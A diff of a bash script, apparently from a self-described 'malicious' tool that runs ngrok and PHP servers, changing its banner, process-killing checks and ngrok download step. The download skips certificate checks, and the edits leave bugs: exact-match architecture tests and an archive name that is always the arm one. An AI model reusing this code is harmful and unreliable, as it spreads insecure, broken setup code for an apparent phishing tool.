@@ -22,7 +22,7 @@ echo "
     ███    ███   ███    ███ ███   ███   ███   ███    ███ ███   ███
     ███    █▀    ████████▀   ▀█   ███   █▀    ██████████  ▀█   █▀ Error
 
--_-  Made By SamadBloch The Malicious -_-
+--  Made By SamadBloch The Malicious --
 
 
 "
@@ -46,7 +46,7 @@ echo "
   ███    ███   ███    ███ ███   ███   ███   ███    ███ ███   ███
   ███    █▀    ████████▀   ▀█   ███   █▀    ██████████  ▀█   █▀ Error
 
--__- Made By SamadbLoch The Malicious -_-
+-_- Made By SamadbLoch The Malicious --
 
 "
 menu() {
@@ -72,15 +72,15 @@ stop() {
     checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
     checkphp=$(ps aux | grep -o "php" | head -n1)
     checkssh=$(ps aux | grep -o "ssh" | head -n1)
-    if [[ $checkngrok == *'ngrok'* ]]; then
+    if [[ $checkngrok == 'ngrok' ]]; then
         pkill -f -2 ngrok > /dev/null 2>&1
         killall -2 ngrok > /dev/null 2>&1
     fi
-    if [[ $checkphp == *'php'* ]]; then
+    if [[ $checkphp == 'php' ]]; then
         pkill -f -2 php > /dev/null 2>&1
         killall -2 php > /dev/null 2>&1
     fi
-    if [[ $checkssh == *'ssh'* ]]; then
+    if [[ $checkssh == 'ssh' ]]; then
         pkill -f -2 ssh > /dev/null 2>&1
         killall ssh > /dev/null 2>&1
     fi
@@ -252,16 +252,17 @@ start() {
         command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
         printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
         arch=$(uname -m)
-        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-            download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
-            elif [[ "$arch" == *'aarch64'* ]]; then
-            download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
-            elif [[ "$arch" == *'x86_64'* ]]; then
-            download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
+        download_ngrok=''
+        if [[ ("$arch" == 'arm') || ("$arch" == 'Android') ]]; then
+            download_ngrok='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
+            elif [[ "$arch" == 'aarch64' ]]; then
+            download_ngrok='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
+            elif [[ "$arch" == 'x86_64' ]]; then
+            download_ngrok='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
         else
-            download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
+            download_ngrok='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
         fi
-        wget --no-check-certificate download_ngrok >/dev/null 2>&1
+        wget --no-check-certificate "$download_ngrok" >/dev/null 2>&1
         unzip ngrok-stable-linux-arm.zip >/dev/null 2>&1
         chmod +x .server/ngrok >/dev/null 2>&1
         rm -rf ngrok-stable-linux-arm.zip >/dev/null 2>&1
